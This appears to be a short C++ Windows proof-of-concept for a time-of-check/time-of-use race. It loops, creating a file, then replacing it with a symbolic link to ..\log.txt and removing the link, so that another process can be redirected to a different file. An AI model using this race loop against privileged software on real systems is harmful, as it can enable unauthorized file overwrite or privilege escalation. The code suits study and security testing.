// TACTOU.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <conio.h>

void ShowError(char* Function, DWORD Error)
{
    char* lpMsgBuf;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        Error,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&lpMsgBuf,
        0, NULL);

    printf("[ERROR] %s() failed with error #%d (%s)\n", Function, Error, lpMsgBuf);

    LocalFree(lpMsgBuf);
}

int main()
{
    HANDLE hFile;
    DWORD wr = 0;
    
    while (TRUE)
    {
        //
        // Create a regular file
        //
        hFile = CreateFileA(".\\2\\222.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (INVALID_HANDLE_VALUE == hFile)
        {
            ShowError("CreateFile", GetLastError());
        }
        if (FALSE == WriteFile(hFile, "Test", 4, &wr, NULL))
        {
            ShowError("WriteFile", GetLastError());
        }
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;


        //
        // Delete the file
        //
        if (!DeleteFileA(".\\2\\222.txt"))
        {
            ShowError("DeleteFile", GetLastError());
        }

        //
        // Create a symbolic link with the same name
        //
        if (!CreateSymbolicLinkA(".\\2\\222.txt", "..\\log.txt", 0))
        {
            ShowError("CreateSymbolicLink", GetLastError());
            continue;
        }
        
        //
        // Delete the symbolic link
        //
        if (!DeleteFileA(".\\2\\222.txt"))
        {
            ShowError("DeleteFile", GetLastError());
        }

        //
        // Stop only if a key has been pressed
        //
        if (_kbhit())
        {
            break;
        }
    }

    return 0;
}